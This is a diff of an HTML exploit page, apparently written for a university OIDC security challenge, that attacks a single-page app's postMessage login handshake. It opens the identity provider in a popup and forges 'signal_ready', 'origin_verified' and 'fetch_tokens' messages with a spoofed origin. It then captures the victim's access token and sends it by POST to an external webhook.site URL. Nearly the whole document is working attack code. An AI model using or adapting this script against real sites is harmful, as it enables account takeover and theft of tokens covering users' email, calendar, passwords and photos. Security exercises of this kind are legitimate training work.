@@ -2,51 +2,65 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Malicious OIDC Exploit (Challenge: Checking the window’s origin)</title>
+  <title>Malicious OIDC Exploit (Full Handshake)</title>
   <style>
     body { font-family: sans-serif; margin: 20px; }
     #log { margin-top: 1em; padding: 1em; background: #f8f8f8; border: 1px solid #ccc; }
   </style>
 </head>
 <body>
-  <h1>Malicious OIDC Exploit #6</h1>
-  <p>This page attempts to trick the IdP into sending tokens here by spoofing <code>signal_ready</code>.</p>
+  <h1>Malicious OIDC Exploit #6 (Full Handshake)</h1>
+  <p>
+    This page attempts the entire <code>postMessage</code> sequence: <br>
+    1) Opens the IdP login flow. <br>
+    2) Spoofs <code>signal_ready</code> with a fake <code>origin</code>. <br>
+    3) Tries sending <code>origin_verified</code> and <code>fetch_tokens</code> to get the token.
+  </p>
+
   <button id="stealBtn">Steal the Victim’s Token</button>
 
-  <h2>Captured Tokens:</h2>
+  <h2>Captured Token:</h2>
   <div id="log">(none yet)</div>
 
   <script>
     /*
-      1) Configure the exact URL for the “Vulnerable SPA Flow” that uses:
-         - sp_verifier=spa-v6 (or whichever “flow #6” is)
-         - sp_id=spa-1
-         - idp_verifier=spa-a6 (if needed)
+      1. Adjust these parameters to match your environment exactly:
+         - sp_verifier / sp_id
+         - idp_verifier
          - response_type=token
          - response_mode=web_message
-         - skip_prompt=1
-      Adjust these parameters to match your challenge environment.
+         - skip_prompt=1 (optional)
     */
-    const spaUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v7&sp_id=spa-1`;
-    const loginUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?client_id=spa-1&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify&response_mode=web_message&scope=profile+email+calendar+passwords+photos&response_type=token&state=not_relevant_for_this_flow&idp_verifier=spa-a6`;
+    // Example “login” URL pointing directly to the IdP:
+    const loginUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?
+      client_id=spa-1
+      &redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify
+      &response_mode=web_message
+      &scope=profile+email+calendar+passwords+photos
+      &response_type=token
+      &state=not_relevant_for_this_flow
+      &idp_verifier=spa-a6`.replace(/\s+/g, '');
 
+    // Where we store a reference to the popup window
     let popupRef;
 
+    // Keep track of handshake steps so we don't spam
+    let hasSentOriginVerified = false;
+    let hasSentFetchTokens = false;
+
     document.getElementById("stealBtn").addEventListener("click", () => {
-      // 2) Open the legitimate SPA login flow in a popup.
+      // 2) Open the legitimate IdP or SPA login flow in a popup.
       popupRef = window.open(loginUrl, "_blank", "width=800,height=600");
 
-      // 3) After some delay, send a fake "signal_ready" to the popup
-      //    telling it that our page is the real SPA origin.
+      // 3) After some delay, spoof "signal_ready" with our attacker origin
       setTimeout(() => {
         if (popupRef) {
-          console.log("[Attack] Sending fake signal_ready with attacker origin...");
+          console.log("[Attack] Sending fake `signal_ready` with attacker origin...");
           popupRef.postMessage(
             {
               jsonrpc: "2.0",
               method: "signal_ready",
-              // We claim our origin is https://evil.com (or wherever we are)
-              // The IdP might trust this string and send tokens back to us.
+              // We claim we are the legitimate SPA
               origin: location.origin
             },
             "*"
@@ -55,23 +69,62 @@
       }, 2000);
     });
 
-    // 4) Listen for tokens from the IdP (if it falls for the trick).
+    // 4) Listen for all postMessage events from the popup or IdP
     window.addEventListener("message", (evt) => {
       console.log("[Attack] Received message:", evt);
-      /*
-        If the IdP or the SPA eventually posts the tokens to us,
-        we look for something like evt.data.tokens.accessToken.value
-      */
+
+      // If the IdP/SPA truly checks event.origin, they might ignore us.
+      // But if they trust the "origin" field, we can continue.
+
+      // Typical flow:
+      //   IdP -> { "jsonrpc":"2.0", "method":"signal_ready" }
+      //   SPA -> { "jsonrpc":"2.0", "method":"origin_verified" }
+      //   IdP -> { "jsonrpc":"2.0", "method":"fetch_tokens" } or directly { tokens: {...} }
+      //   SPA -> { tokens: { ... } }
+
+      // Step A: If we see the IdP telling us "signal_ready", we pretend to verify origin
+      if (
+        evt.data &&
+        evt.data.jsonrpc === "2.0" &&
+        evt.data.method === "signal_ready" &&
+        !hasSentOriginVerified
+      ) {
+        console.log("[Attack] Got `signal_ready` from IdP; sending `origin_verified`...");
+        hasSentOriginVerified = true;
+        popupRef.postMessage(
+          { jsonrpc: "2.0", method: "origin_verified", origin: location.origin },
+          "*"
+        );
+      }
+
+      // Step B: If we see "origin_verified" from the IdP, we ask for tokens
+      if (
+        evt.data &&
+        evt.data.jsonrpc === "2.0" &&
+        evt.data.method === "origin_verified" &&
+        !hasSentFetchTokens
+      ) {
+        console.log("[Attack] Got `origin_verified`; sending `fetch_tokens` request...");
+        hasSentFetchTokens = true;
+        popupRef.postMessage(
+          { jsonrpc: "2.0", method: "fetch_tokens", origin: location.origin },
+          "*"
+        );
+      }
+
+      // Step C: If the IdP or SPA eventually sends tokens
       if (evt.data && evt.data.tokens && evt.data.tokens.accessToken && evt.data.tokens.accessToken.value) {
         const stolenToken = evt.data.tokens.accessToken.value;
         document.getElementById("log").textContent = "Stolen Token: " + stolenToken;
 
-        // Exfiltrate the token to your webhook or attacker server
+        // Exfiltrate to attacker server or webhook
         fetch("https://webhook.site/07fd3bca-c584-4cdf-8ae7-3895bf6f1ceb/", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ accessToken: stolenToken })
+          body: JSON.stringify({ stolenToken })
         });
+
+        console.log("[Attack] SUCCESS! Stolen Token:", stolenToken);
       }
     });
   </script>
